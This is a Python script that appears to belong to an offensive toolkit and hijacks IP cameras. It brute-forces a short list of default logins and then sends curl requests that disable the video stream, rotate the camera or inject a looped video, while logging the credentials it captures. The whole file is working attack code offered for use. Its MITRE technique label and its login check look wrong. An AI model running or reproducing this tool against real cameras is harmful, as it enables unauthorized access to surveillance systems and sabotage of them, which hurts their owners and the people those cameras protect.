#!/usr/bin/env python3
# modules/attacks/ip_camera_hijack.py

import os
import time
import argparse
import subprocess
import json
from datetime import datetime

LOG_FILE = "results/ipcam_hijack_log.json"
MITRE_TTP = "T1055.012"
DEFAULT_CREDENTIALS = [("admin", "admin"), ("root", "root"), ("admin", "12345")]

def log_event(ip, action, creds):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "action": action,
            "credentials": creds,
            "ttp": MITRE_TTP
        }) + "\n")

def hijack_camera(ip, action, username=None, password=None):
    if not username or not password:
        for user, pwd in DEFAULT_CREDENTIALS:
            if test_creds(ip, user, pwd):
                username, password = user, pwd
                break
    if not username:
        print(f"[!] Failed to authenticate with known credentials.")
        return

    log_event(ip, action, f"{username}:{password}")

    if action == "disable":
        subprocess.run(["curl", "-u", f"{username}:{password}", f"http://{ip}/cgi-bin/disable_stream.cgi"])
    elif action == "rotate":
        subprocess.run(["curl", "-u", f"{username}:{password}", f"http://{ip}/cgi-bin/ptz.cgi?action=rotate&value=180"])
    elif action == "loop":
        subprocess.run(["curl", "-u", f"{username}:{password}", f"http://{ip}/cgi-bin/upload_loop.cgi?file=loop.mp4"])
    print(f"[✓] Camera {ip} action '{action}' executed.")

def test_creds(ip, user, pwd):
    try:
        r = subprocess.run(
            ["curl", "-s", "-u", f"{user}:{pwd}", f"http://{ip}/"],
            stdout=subprocess.PIPE,
            timeout=3
        )
        return b"200 OK" in r.stdout or r.returncode == 0
    except:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack IP cameras via web or ONVIF")
    parser.add_argument("--ip", required=True, help="Target camera IP address")
    parser.add_argument("--action", choices=["disable", "rotate", "loop"], required=True, help="Action to execute")
    parser.add_argument("--user", help="Username (optional)")
    parser.add_argument("--passw", help="Password (optional)")
    args = parser.parse_args()

    hijack_camera(args.ip, args.action, args.user, args.passw)
